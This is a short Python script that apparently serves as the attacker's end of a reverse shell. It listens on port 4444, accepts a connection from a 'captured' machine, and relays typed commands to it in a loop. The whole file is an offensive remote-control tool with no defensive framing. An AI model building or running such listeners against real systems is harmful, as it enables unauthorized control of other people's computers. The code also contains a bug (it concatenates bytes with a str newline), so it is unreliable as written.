import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 4444))
s.listen(1)
target_conn, target_addr = s.accept()
print(f"captures a machine {target_addr} ")

while True:
       raw_bytes = target_conn.recv(5096)
       bytes_decode = raw_bytes.decode('ascii')
       print(f"{bytes_decode}")
       attacker_input = input()
       encoded_attacker_input = attacker_input.encode('ascii')
       target_conn.sendall(encoded_attacker_input + "\n")
                                                                                                   
 




